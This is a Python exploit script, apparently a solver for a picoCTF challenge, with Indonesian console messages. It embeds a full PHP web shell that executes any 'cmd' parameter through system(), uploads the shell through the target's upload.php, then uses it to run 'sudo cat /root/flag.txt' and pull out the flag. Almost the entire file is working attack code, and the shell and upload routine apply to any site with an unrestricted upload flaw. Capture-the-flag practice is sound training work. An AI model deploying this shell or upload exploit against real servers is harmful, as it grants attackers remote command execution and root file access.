import io
import requests
import re
import sys
from bs4 import BeautifulSoup
import time
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
## script php web shell
f = """<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>"""

script = io.StringIO()
script.write(f)

def main():
    if len(sys.argv) != 2:
        print("(-) masukkan web yang dituju")
        print("(-) jangan pake / diakhir")
        sys.exit(-1)
    url = sys.argv[1]
    s = requests.session()
    r = s.get(url=url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("(+) berhasil menjangkau web")
        upload = url + "/upload.php"
        file = {"fileToUpload": ("untitled.php", script.getvalue(), "application/octet-stream")}
        data = {"sumbit": "Upload File"}
        r = s.post(upload, files=file, data=data,verify=False, proxies=proxies)
        if "has been uploaded Path" in r.text:
            print("(+) berhasil upload file")
            print("(+)sedang mencari flag")
            command = url + "/uploads/untitled.php?cmd=sudo+cat+%2Froot%2Fflag.txt"
            r = s.get(command, verify=False, proxies=proxies)
            if r.status_code == 200:
                print("(+) flag sudah ketemu")
                match = re.search(r"picoCTF\{[^}]+\}", r.text)
                if match:
                    print("(+) ini flagnya " + match.group(0))
                
        else:
            print("(-) gagal")
    else:
        print("(-) gagal")



if __name__ == "__main__":
    main()

script.close
